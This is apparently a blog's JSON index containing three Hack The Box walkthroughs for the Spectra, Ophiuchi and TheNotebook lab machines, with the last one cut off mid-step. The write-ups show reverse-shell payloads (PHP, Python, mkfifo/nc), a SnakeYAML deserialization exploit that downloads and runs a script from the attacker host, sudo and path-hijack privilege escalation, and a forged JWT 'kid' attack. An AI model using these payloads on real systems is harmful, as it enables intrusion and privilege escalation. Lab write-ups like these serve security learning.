        "title": "Walktrough: HTB Spectra",
        "excerpt":"Hello guys!   This week’s machine will be Spectra, another easy-rated box from Hack The Box, created by egre55.   :information_source: Info: Write-ups for Hack The Box machines are posted as soon as they’re retired.      Enumeration   As usual, started with a quick nmap scan to enumerate all published services in this box.   $ target=10.10.10.229; nmap -sC -sV -Pn -oA quick $target Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-12 12:57 EST Nmap scan report for 10.10.10.229 Host is up (0.079s latency). Not shown: 997 closed ports PORT     STATE SERVICE VERSION 22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0) | ssh-hostkey: |_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA) 80/tcp   open  http    nginx 1.17.4 |_http-server-header: nginx/1.17.4 |_http-title: Site doesn't have a title (text/html). 3306/tcp open  mysql   MySQL (unauthorized) |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_sslv2: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 40.73 seconds   80/TCP - HTTP Service   After first access to this service, we notice a quite simple HTML page containing a message and two links.   While inspecting the source code of this page, we can see that both links refer to assets located at spectra.htb domain, which was later added to the local hosts file to correct name resolution.      &lt;h1&gt;Issue Tracking&lt;/h1&gt;  &lt;h2&gt;Until IT set up the Jira we can configure and use this for issue tracking.&lt;/h2&gt;  &lt;h2&gt;&lt;a href=\"http://spectra.htb/main/index.php\" target=\"mine\"&gt;Software Issue Tracker&lt;/a&gt;&lt;/h2&gt; &lt;h2&gt;&lt;a href=\"http://spectra.htb/testing/index.php\" target=\"mine\"&gt;Test&lt;/a&gt;&lt;/h2&gt;   Accessing both links, I have noticed that these were WordPress websites but only the first (Software Issue Tracker) was working properly while the second (Test), was displaying a database connection error.         WPScan   To gather more information about both WordPress sites, executed WPScan against them, but only worked to the first once the Test wasn’t working correctly.   wpscan --url &lt;url&gt; -e vp,vt,tt,cb,dbe,u,m --plugins-detection aggressive --plugins-version-detection aggressive -f cli-no-color 2&gt;&amp;1 | tee \"./wpscan_&lt;url&gt;.txt\"   The following information was identified for the main (Software Issue Tracking) website:      WordPress version: 5.4.2   Users: administrator   Proceeding with a manual enumeration, also noticed that for Testing website there’s no redirect to index.php, allowing us to list the directory content, allowing us to spot an interesting file: wp-config.php.save.      As this file isn’t with the *.php extension, it won’t be interpreted by the webserver, allowing us to download it, as the command line below.   wget http://spectra.htb/testing/wp-config.php.save   Inspecting its content, we can see the credentials for user devtest, as listed below:      Username: devtest     Password: devteam01    // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define( 'DB_NAME', 'dev' );  ...skipping 1 line define( 'DB_USER', 'devtest' );  /** MySQL database password */ define( 'DB_PASSWORD', 'devteam01' );  /** MySQL hostname */ define( 'DB_HOST', 'localhost' );  /** Database Charset to use in creating database tables. */ define( 'DB_CHARSET', 'utf8' );  /** The Database Collate type. Don't change this if in doubt. */ define( 'DB_COLLATE', '' );   As the nmap enumeration listed a MySQL database, tried to use these creds to authenticate to it but the source IP wasn’t allowed to connect to the specified instance, preventing us to harvest some sensitive information from the database.   $ mysql -u devtest -p -h spectra.htb Enter password: ERROR 1130 (HY000): Host '10.10.10.10' is not allowed to connect to this MySQL server   As credential reuse is a common thing, tried to authenticate to WordPress with the password found for the username administrator and had success in it!      Initial Access   Once we have access to the WordPress administration console, there are several ways to get a reverse shell with this permission, being the most common the upload of a malicious plugin to it with a web shell or reverse shell payload.   The easiest way would use the wp_admin_shell_upload module from Metasploit Framework but, if you’re preparing for the OSCP exam, where you should wisely choose when to use the msfconsole, using it for this isn’t a good idea :smile:.   So, to create this plugin, I have executed the following steps:      Created a file with the plugin header. This header must follow the minimum requirements as documented on Header Requirements | Plugin Developer Handbook | WordPress Developer Resources. In our case I’ve created the file evilplugin.php with the contents below:   /**  * Plugin Name: evilplugin   * Version: 1.0   * Author: evilauthor   * Author URI: http://evilplugin.test.com   * License: GPL2   */      Create another file with the desired payload. In this case, as my objective is to directly get a reverse shell, made a copy of Pentest Monkey’s PHP reverse shell, changing the details to my IP address and port, saving it as exploit.php.   // Usage // ----- // See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck. set_time_limit (0); $VERSION = \"1.0\"; $ip = '10.10.10.10';  // CHANGE THIS $port = 4443;       // CHANGE THIS $chunk_size = 1400; $write_a = null; $error_a = null; $shell = 'uname -a; w; id; /bin/sh -i'; $daemon = 0; $debug = 0;      Compress the file as below, where the file name must be the same as the plugin header with the zip extension.   $ zip evilplugin.zip evilplugin.php exploit.php   adding: evilplugin.php (deflated 9%)   adding: exploit.php (deflated 59%)      Once created, accessed the WordPress portal, authenticated with the administrative account and, from the left side, selected the options Plugins &gt; Add New and, at the top of the page, hit the button Upload Plugin         Initialize the listener according to the configured payload. In our case, I’ve started a netcat listener using the command line below   nc -lnvp 4443      Selected the zip file and hit the button Install Now         As soon as the install request is processed, is important to issue the request to the file location under the WordPress folder structure. The command line below uses curl to make the request, but you could use your browser as well.   curl -L http://spectra.htb/main/wp-content/plugins/evilplugin/exploit.php   After this process, we should receive a connection from the victim machine, we below: :smiley:   $ nc -lnvp 4443 listening on [any] 4443 ... connect to [10.10.10.10] from (UNKNOWN) [10.10.10.229] 43298 Linux spectra 5.4.66+ #1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64 AMD EPYC 7401P 24-Core Processor AuthenticAMD GNU/Linux  08:41:48 up 4 min,  0 users,  load average: 0.26, 0.31, 0.17 USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT uid=20155(nginx) gid=20156(nginx) groups=20156(nginx) nginx@spectra / $ id id uid=20155(nginx) gid=20156(nginx) groups=20156(nginx) nginx@spectra / $   :bulb: Tip: There are several ways to achieve the same outcome not using the Metasploit framework. You could inject code into a Theme file or even use other scripts/tools available like n00py/WPForce: WordPress Attack Suite (github.com), which automates this and other tasks frequently used while compromising WordPress sites.   User flag   After the initial access, initiated the machine enum using linpeas.sh, where the following details were identified:           User: nginx, without any special privileges (uid=20155(nginx) gid=20156(nginx) groups=20156(nginx))            Operating System: Chromium OS 11.0_pre399094_p20200824-r6            Content published using Nginx from /usr/local/share/nginx/html directory, vide file path of wp-config.php files, where the creds below were also harvested:                                  site           Username           Password                                           main           dev           development01                             testing           devtest           devteam01                                Users with console access, being a possible elevation path, as well as their privileges:       [+] Users with console chronos:x:1000:1000:system_user:/home/chronos/user:/bin/bash katie:x:20156:20157::/home/katie:/bin/bash root:x:0:0:root:/root:/bin/bash  uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers) uid=1001(chronos-access) gid=1001(chronos-access) groups=1001(chronos-access)           MySQL  Ver 14.14 Distrib 5.7.20-19, for Linux (x86_64) using  6.3            Possible SSH keys       /usr/share/chromeos-ssh-config/keys/authorized_keys /usr/share/chromeos-ssh-config/keys/id_rsa /usr/share/chromeos-ssh-config/keys/id_rsa.pub      Uncommon passwd files, being one of them for autologin containing the password SummerHereWeCome!!   [+] Searching uncommon passwd files (splunk) passwd file: /etc/autologin/passwd passwd file: /etc/pam.d/passwd passwd file: /usr/share/baselayout/passwd  /etc/autologin/passwd -rw-r--r-- 1 root root 19 Feb  3 16:43 /etc/autologin/passwd SummerHereWeCome!!      File user.txt at katie’s home path, seen from a manual enumeration.   Once we have found some passwords, decided to test them for users katie and chronos, being successful with the combination katie:SummerHereWeCome!!   With access to this profile, got the user flag in her home directory   katie@spectra ~ $ id uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers) katie@spectra ~ $ cat user.txt e89d27fe195e9114ffa72ba8913a6130 katie@spectra ~ $   Root flag   As we had katie’s password, the first thing I did was to check if she was able to run something as root, as the following entry was found.   katie@spectra ~ $ sudo -l User katie may run the following commands on spectra:     (ALL) SETENV: NOPASSWD: /sbin/initctl katie@spectra ~ $   Checking the binary, identified that it could be used to control jobs in the machine, as instructed below, but we would need to tamper with one of these jobs to get root access.   katie@spectra ~ $ /sbin/initctl help Job commands:   start                       Start job.   stop                        Stop job.   restart                     Restart job.   reload                      Send HUP signal to job.   status                      Query status of job.   list                        List known jobs.  Event commands:   emit                        Emit an event.  Other commands:   reload-configuration        Reload the configuration of the init daemon.   version                     Request the version of the init daemon.   log-priority                Change the minimum priority of log messages from the init daemon   show-config                 Show emits, start on and stop on details for job configurations.   help                        display list of commands   Once katie’s is a member of the developers group, decided to look for files where this group was under the permissions and found some files in /etc/init folder, listed as jobs by initctl.   katie@spectra ~ $ find / -group developers 2&gt;/dev/null /etc/init/test6.conf /etc/init/test7.conf /etc/init/test3.conf /etc/init/test4.conf /etc/init/test.conf /etc/init/test8.conf /etc/init/test9.conf /etc/init/test10.conf /etc/init/test2.conf /etc/init/test5.conf /etc/init/test1.conf /srv /srv/nodetest.js katie@spectra ~ $ ls -la /etc/init/test* -rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test.conf -rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test1.conf -rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test10.conf -rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test2.conf -rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test3.conf -rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test4.conf -rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test5.conf -rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test6.conf -rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test7.conf -rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test8.conf -rw-rw---- 1 root developers 478 Jun 29  2020 /etc/init/test9.conf   To gain root access, I just needed to change one of the job files to get a reverse shell and then get the root’s flag.   I have chosen the file /etc/init/test10.conf, which had the content below, and changed only the script section, as the second block shared below.   katie@spectra ~ $ cat /etc/init/test10.conf description \"Test node.js server\" author      \"katie\"  start on filesystem or runlevel [2345] stop on shutdown  script      export HOME=\"/srv\"     echo $$ &gt; /var/run/nodetest.pid     exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js  end script   # Edited portion script   python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.10\",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' end script   After editing the file, initiated the netcat listener and stopped and started again the job, getting a reverse shell   # At Spectra as Kali katie@spectra /etc/init $ sudo /sbin/initctl stop test10 initctl: Unknown instance: katie@spectra /etc/init $ sudo /sbin/initctl start test10 test10 start/running, process 4947   # At attacker machine $ nc -lnvp 4443 listening on [any] 4443 ... connect to [10.10.10.10] from (UNKNOWN) [10.10.10.229] 33606 # id uid=0(root) gid=0(root) groups=0(root) # whoami root # cat /root/root.txt &lt;redacted&gt;   I hope you guys have enjoyed it!   See you in the next post :smiley:  ","categories": ["Walkthrough"],
        "tags": ["HackTheBox","HTB Easy","HTB Linux"],
        "url": "/walkthrough/2021/06/htb-spectra",
        "teaser": "https://i.imgur.com/KjpVjtL.png"
      },{
        "title": "Walktrough: HTB Ophiuchi",
        "excerpt":"Hello guys!   This week’s machine will be Ophiuchi, another medium-rated box from Hack The Box, created by felamos.   :information_source: Info: Write-ups for Hack The Box machines are posted as soon as they’re retired.      Recently I have been starting the recon of HTB boxes by searching a little about their names, as it or their images can give some cues on how to pwn them.   Searching define ophiuchi in Google I was redirected to `define Ophiuchus, which is commonly represented as a man grasping a snake, what makes sense once we have a picture of a planet, astronaut, and some stars, but we’ll see that isn’t only that! :smiley:   Enumeration   Starting the enumeration, as usual, running a quick nmap scan to find the published services.   $ nmap -sC -sV -Pn -oA quick 10.10.10.227 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-27 17:32 -03 Nmap scan report for 10.10.10.227 Host is up (0.077s latency). Not shown: 998 closed ports PORT     STATE SERVICE VERSION 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA) |   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA) |_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519) 8080/tcp open  http    Apache Tomcat 9.0.38 |_http-title: Parse YAML Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.18 seconds   8080/TCP - Tomcat   Accessing the Tomcat page at http://10.10.10.227:8080 we see a YAML parser website, as below:      Sending a simple payload (teste: true), the following message is returned:      Due to security reasons this feature has been temporarily on hold. We will soon fix the issue!    Once Tomcat is a Java web server, and, based on the message returned, searched about java yaml rce vulnerability where I’ve found a Medium post talking about a vuln called SnakeYAML, which had a PoC like the website we have. Also, as snake have some references to the constellation from which this box was named, proves we’re on the right path :smile:.   Following the suggestion in the post, started a simple http server using python (sudo python3 -m http.server 80) and sent the following payload:   !!javax.script.ScriptEngineManager [   !!java.net.URLClassLoader [[     !!java.net.URL [\"http://10.10.10.10/\"]   ]] ]   Just like the PoC in the blog post, the server searches for a file in /META-INF/services/javax.script.ScriptEngineFactory should provide a java class to be executed, which was confirmed based on the logs below.   $ sudo python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.10.227 - - [28/Feb/2021 12:19:22] code 404, message File not found 10.10.10.227 - - [28/Feb/2021 12:19:22] \"HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1\" 404 -   Initial access   To gain initial access to this machine, used the project referenced in the blog post found (artsploit/yaml-payload: A tiny project for generating SnakeYAML deserialization payloads).   git clone https://github.com/artsploit/yaml-payload.git   As recommended, we’ll add our payload in the class named AwesomeScriptEngineFactory.java compile it and invoke it from the payload sent in the form.   First I have tried to use payload rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f directly in the class yaml-payload\\src\\artsploit\\AwesomeScriptEngineFactory.java but as it uses some redirects and pipelines (&gt; e |) noticed that the best approach would host a payload file in the webserver, download it and run from the victim machine, as the edit below:       public AwesomeScriptEngineFactory() {         try {             Runtime.getRuntime().exec(\"wget http://10.10.10.10/payload -O /tmp/exploit.sh\");             Runtime.getRuntime().exec(\"chmod a+x /tmp/exploit.sh\");             Runtime.getRuntime().exec(\"bash /tmp/exploit.sh\");         } catch (IOException e) {             e.printStackTrace();         }     }   After modified, compiled the class and copied to the path where it was being called from:   javac src/artsploit/AwesomeScriptEngineFactory.java jar -cvf yaml-payload.jar -C src/ .   After that, as well as copying the payload file to be executed, sent the payload below on the webpage   !!javax.script.ScriptEngineManager [   !!java.net.URLClassLoader [[     !!java.net.URL [\"http://10.10.10.10/yaml-payload.jar\"]   ]] ]   And voilá! We got a reverse shell in the box! :smile:   bash-5.0$ hostname &amp;&amp; id ophiuchi uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat) bash-5.0$   User flag   Started the enumeration, as usual, using linpeas.sh, where I could identify the following points:      Tomcat service running with its specific account, allowing us to read the app files and logs   Enumerating the users in this box, found admin, the only one with console access (besides root).   With this information, verified the creds for Tomcat from /opt/tomcat/conf/tomcat-users.xml file, where the password whythereisalimit was found.   &lt;user username=\"admin\" password=\"whythereisalimit\" roles=\"manager-gui,admin-gui\"/&gt;   Testing it for the user admin, we have confirmed that it was valid.      Once we have a Linux user with the same name admin, once tried to reuse the same creds using ssh, I was successful in logging in, obtaining the user’s flag.   Last login: Sun Apr 18 01:22:24 2021 from 10.10.10.10 -bash-5.0$ hostname &amp;&amp; id ophiuchi uid=1000(admin) gid=1000(admin) groups=1000(admin) -bash-5.0$ cat user.txt  &lt;redacted&gt; -bash-5.0$   Root flag   Besides always give linpeas.sh another try, once we have the password for the user I like to check if the user can run anything with root privileges, where in this case we were lucky and got the following output:   -bash-5.0$ sudo -l Matching Defaults entries for admin on ophiuchi:     env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User admin may run the following commands on ophiuchi:     (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go   Inspecting the file /opt/wasm-functions/index.go we have the following content:   package main  import (         \"fmt\"         wasm \"github.com/wasmerio/wasmer-go/wasmer\"         \"os/exec\"         \"log\" )   func main() {         bytes, _ := wasm.ReadBytes(\"main.wasm\")          instance, _ := wasm.NewInstance(bytes)         defer instance.Close()         init := instance.Exports[\"info\"]         result,_ := init()         f := result.String()         if (f != \"1\") {                 fmt.Println(\"Not ready to deploy\")         } else {                 fmt.Println(\"Ready to deploy\")                 out, err := exec.Command(\"/bin/sh\", \"deploy.sh\").Output()                 if err != nil {                         log.Fatal(err)                 }                 fmt.Println(string(out))         } }   As we can see, this is a Go Lang script that loads its variables from main.wasm and, if the value f under property info is equal to 1, the file deploy.sh is executed.   As both files (main.wasm e deploy.sh) execute from a relative path, they are vulnerable to path hijacking, which we’ll try now.   The initial step is to create both files and start them from a directory we have to write permissions, in this case, /dev/shm.   mkdir /dev/shm/zurc cd /dev/shm/zurc   deploy.sh   Creating this file is easy. At first, I’ll just place an id command to be sure we have succeeded with the permission abuse.   #!/bin/bash  id   Once confirmed, we’ll replace this file contents with the reverse shell command line below   #!/bin/bash  rm /tmp/zurc;mkfifo /tmp/zurc;cat /tmp/zurc|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/zurc   main.wasm   This item is a little more complex to craft as when I first opened it in the editor, noticed that was something compiled and not plain text.   Searching a little on how to modify a wasm file, found this blog post on Mozilla developers on how to convert a WebAssembly Text to WASM, which also refers to the repo WebAssembly/wabt: The WebAssembly Binary Toolkit no GitHub.   The following steps were used to inspect and modify the main.wasm file:      Locate the file in the victim machine and make a copy using scp   # Ophiuchi admin@ophiuchi:~$ find / -type f 2&gt; /dev/null | grep main.wasm /opt/wasm-functions/main.wasm /opt/wasm-functions/backup/main.wasm   # Attacker Machine $ cd ./loot $ scp admin@10.10.10.227:/opt/wasm-functions/main.wasm .      Downloaded the compiled wabt version to my working directory and extracted it   wget https://github.com/WebAssembly/wabt/releases/download/1.0.23/wabt-1.0.23-ubuntu.tar.gz tar -xzvf wabt-1.0.23-ubuntu.tar.gz      Using the recently downloaded tool, converted the main.wasm to main.wat, where we got the following content   $ wabt-1.0.23/bin/wasm2wat main.wasm -o main.wat $ cat main.wat                                                                                            (module   (type (;0;) (func (result i32)))   (func $info (type 0) (result i32)       i32.const 0)   (table (;0;) 1 1 funcref)   (memory (;0;) 16)   (global (;0;) (mut i32) (i32.const 1048576))   (global (;1;) i32 (i32.const 1048576))   (global (;2;) i32 (i32.const 1048576))   (export \"memory\" (memory 0))   (export \"info\" (func $info))   (export \"__data_end\" (global 1))   (export \"__heap_base\" (global 2)))           Once we need to return f == 1, which is a property of info, we needed to change the line i32.const 0 to i32.const 1 at line 4.            After changing it, compiled the file again to main.wasm and transferred it to the victim machine as below       wabt-1.0.23/bin/wat2wasm main.wat -o main.wasm scp main.wasm admin@10.10.10.227:/dev/shm/zurc      In a second attempt, we had success on running the crafted deploy.sh as root :smiley:   admin@ophiuchi:/dev/shm/zurc$ sudo /usr/bin/go run /opt/wasm-functions/index.go Ready to deploy uid=0(root) gid=0(root) groups=0(root)      After that, modified the file to the previously shared reverse shell command line, obtained interactive access as root, and was able to get its flag.   $ nc -lnvp 4443 listening on [any] 4443 ... connect to [10.10.10.10] from (UNKNOWN) [10.10.10.227] 50068 # hostname &amp;&amp; id ophiuchi uid=0(root) gid=0(root) groups=0(root) # cat /root/root.txt &lt;redacted&gt;   I hope you have enjoyed it!   See you in the next post :smile:  ","categories": ["Walkthrough"],
        "tags": ["HackTheBox","HTB Medium","HTB Linux"],
        "url": "/walkthrough/2021/07/htb-ophiuchi",
        "teaser": "https://i.imgur.com/r9JpwZX.png"
      },{
        "title": "Walktrough: HTB TheNotebook",
        "excerpt":"Hello guys!   This week’s machine will be TheNotebook, another medium-rated Linux box from Hack The Box, created by mostwanted002.   :information_source: Info: Write-ups for Hack The Box machines are posted as soon as they’re retired.      This box was a very interesting one, where I had the opportunity to learn more about JWT Tokens in the path for initial access and then more docker escaping techniques abusing capabilities so I could get root.   Enumeration   As usual, we start with a quick nmap scan to see which services are published in this box.   $ nmap -sC -sV -Pn -oA quick 10.10.10.230                                                                                        Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-10 15:05 -03 Stats: 0:00:01 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan NSE Timing: About 0.00% done Nmap scan report for 10.10.10.230 Host is up (0.072s latency). Not shown: 997 closed ports PORT      STATE    SERVICE VERSION 22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA) |   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA) |_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519) 80/tcp    open     http    nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: The Notebook - Your Note Keeper 10010/tcp filtered rxapi Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.97 seconds   80/TCP - HTTP Service   Accessing the page, noticed that is a simple HTTP application, which uses the default Bootstrap and no sign of a CMS like WordPress or other known application.      The guessing was confirmed during whatweb execution, which listed only the two known components, as well as the webserver it is running on which is an Nginx.   $ whatweb 10.10.10.230 http://10.10.10.230 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.10.230], Title[The Notebook - Your Note Keeper], nginx[1.14.0]   Checking the website with gobuster found the following application pages but were the same already seen inspecting the source code during initial navigation.   $ gobuster dir -u http://10.10.10.230 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php -t 50 -o gobuster.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url:                     http://10.10.10.230 [+] Method:                  GET [+] Threads:                 50 [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes:   404 [+] User Agent:              gobuster/3.1.0 [+] Extensions:              html,txt,php [+] Timeout:                 10s =============================================================== 2021/06/10 16:04:30 Starting gobuster in directory enumeration mode =============================================================== /login                (Status: 200) [Size: 1250] /register             (Status: 200) [Size: 1422] /admin                (Status: 403) [Size: 9] /logout               (Status: 302) [Size: 209] [--&gt; http://10.10.10.230/]  =============================================================== 2021/06/10 16:34:27 Finished ===============================================================   As I haven’t found anything specific, decided to poke a little bit with this app, while inspecting the requests using Burp Suite, looking for an opportunity.   Started by creating an account, clicking on the Register link where some basic information was requested as the image below, and resulted in the account creation without any further problem.      After being created, was redirected to a logged page where I was able to create some notes but interacting with these resources didn’t seem that they could be exploited, unless the app would be vulnerable by some kind of SSTI (Server-Side Template Injection) once these notes are shown in the page.      Inspecting the requests made so far in Burp since the account creation, nothing interesting was found in the request that could be tampered with to grant us a privileged account but his response is interesting. In this response, we receive a Set-Cookie for an object named auth, which contained something that resembled a Token JWT.   HTTP/1.1 302 FOUND Server: nginx/1.14.0 (Ubuntu) Date: Thu, 10 Jun 2021 20:46:42 GMT Content-Type: text/html; charset=utf-8 Content-Length: 209 Location: http://10.10.10.230/ Connection: close Set-Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Impkb2UiLCJlbWFpbCI6Impkb2VAZHVtbXkuY29tIiwiYWRtaW5fY2FwIjowfQ.Ixm8_VYcfY_WAv0L7i27vyOW15dd2UuhhlOrRaSiwVFyge6_JmC2FjUEYHNh_j4xXFjfaeUR7gkifezXjsJwz99U1zpcp0CaOI9-RWXLSTpnZvprcCCyN5seCkJHNx45-Qb5mCjGDGQbrxkrcUuV8tVcdkEpFi90BfXL6XGGxJe-Ms6YiDWK1fhpaGfKXcRyAYUGWoTs62ulrVwV5fKhH978OE17egmvNWpOL0dNpmpdoCTTKYBX1KDyyFMWJvZWkydPCNPPAaqk0pNxSwiWOYzBBErx2EBd58gpZWlBLNf5JnjyoBXdHt4JdHVcpoZsmBsAT_gxRU_uffzwxTNQN9-vrsA7tLzWuyWWt32s_8hGGrauEBSW4aPP5xRbpGclDfw2KPa7qHdVa5SApHHQrDFfpxhU2hFjvjlBtmwfjJbNHb53ZRXmz0SPRLKf6sOpX3Iswld58yBYP9xtIr3eCsdW1boCsDflfjUi9LQqsM3d_PTgGgzBLIXBQXXj82i0CzlwD3rYl3AjR7IBgBZNee5HJVdNUPYx6e_uG7WU94LUBy7WsfPfYY8VHjbuWVY1Nq3Wqhg2Sb04XmWBbtbV5C12YOu-oA7A6KrloeGOjLHkIlTsnLAj3eNhl_eo5aiLuQL3P5HrGr0K_rrniLHTCGTWX3KM4qgtI57IsbXN0Dw; Path=/ Set-Cookie: uuid=796e6cc3-aa50-4f87-b74f-408146886c66; Path=/  &lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"&gt; &lt;title&gt;Redirecting...&lt;/title&gt; &lt;h1&gt;Redirecting...&lt;/h1&gt; &lt;p&gt;You should be redirected automatically to target URL: &lt;a href=\"/\"&gt;/&lt;/a&gt;.  If not click the link.   Checking its content at jwt.ms, noticed some details that could allow us to elevate our privileges:      kid header, which defines the private key location in an HTTP Server running locally in the application server, is used to sign and evaluate the issued token.   admin_cap payload, which possibly contains a binary or integer that represents the privilege/role of the user, that for our recently created account is 0.   {   \"typ\": \"JWT\",   \"alg\": \"RS256\",   \"kid\": \"http://localhost:7070/privKey.key\" }.{   \"username\": \"jdoe\",   \"email\": \"jdoe@dummy.com\",   \"admin_cap\": 0 }.[Signature]   The fact is: We cannot modify the issued token without signing it again with the key available in the server, but, once the token has a field pointing to the path to the key to which it was signed, we could get a chance to recreate this token, signing it with our own RSA key and making it available to the backend during our credential validation, but we can only be sure testing :stuck_out_tongue_winking_eye:.   Initial access   Once we need to create a token, searching for the easiest way to do it I have found a python library called PyJWT that seemed quite easy to be used. In the initial docs page, we have a sample code signing a token but we need to dig further in their documentation to find a way to add the kid header and create the cert.   Achieved the desired outcome by running the following steps:      Created the RSA key using the command line below. We’ll have as output the content of the public key and, in the specified file, the private key.   openssl req -nodes -new -x509 -keyout privKey.key -noout -pubkey      Published the private key using a simple HTTP Server, using the same port web server was using in the observed token.   python3 -m http.server 7070           After creating the key, wrote a script as content below using the obtained values of public and private keys and signed the payload. This script uses examples located at Usage Examples in the official module documentation.              Necessary to install the module using the command pip3 install pyjwt. In case jwt module is already installed, necessary to remove it first, otherwise, the script will fail.           #!/usr/bin/python3 import jwtprivate_key = b\"\"\"-----BEGIN PRIVATE KEY----- MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDT/8rR3ZkWJOJN [...] XDmj7j8p7kdd2ZM1MYTO6A0= -----END PRIVATE KEY-----\"\"\" payload = {     \"username\": \"jdoe\",     \"email\": \"jdoe@dummy.com\",     \"admin_cap\": 1 } header = {\"kid\": \"http://10.10.10.10:7070/privKey.key\"} encoded = jwt.encode(payload, private_key, algorithm=\"RS256\",headers=header) print(encoded)   Sample output is pasted below:   $ python3 generate-jwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xMTY6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Impkb2UiLCJlbWFpbCI6Impkb2VAZHVtbXkuY29tIiwiYWRtaW5fY2FwIjoxfQ.WMokYjjMMECoF2UWM2fcMVcR99X34dHXwuj8nXqBlQWOnwC1NdBoO6PD-ZHjAZ5p969Jbf4XnRKZedAAokxvIgG2ymYNV1F8CcDzDfuHlMlk_CiYGvimoJWgvA3S-24KDql2bRrvJgoPbKKjqJ5Ir7mWZF1USGSwsttc9Ff1qniFAWTJ8CXkTLtfR498_rY_uIJfBdvqTbi3C9fWJcnSwjCGROkEGxCYve4cf5rjFvm_D_G5-S8oWkXICYAFp5lMQ288E0qGQp04nD16H1v2YzOROolNDeqMVB2uaI060xjKEA8mv6taa095q7rEqzpzXSj21Uq2-xcZonk0LI1-yg   The generated token, according to jwt.ms, generated the payload below:   {     \"typ\": \"JWT\",     \"alg\": \"RS256\",     \"kid\": \"http://10.10.10.10:7070/privKey.key\" }.{     \"username\": \"jdoe\",     \"email\": \"jdoe@dummy.com\",     \"admin_cap\": 1 }.[Signature]      As everything went as expected, is now time to change the cookie value in the browser and :boom:: a request was received 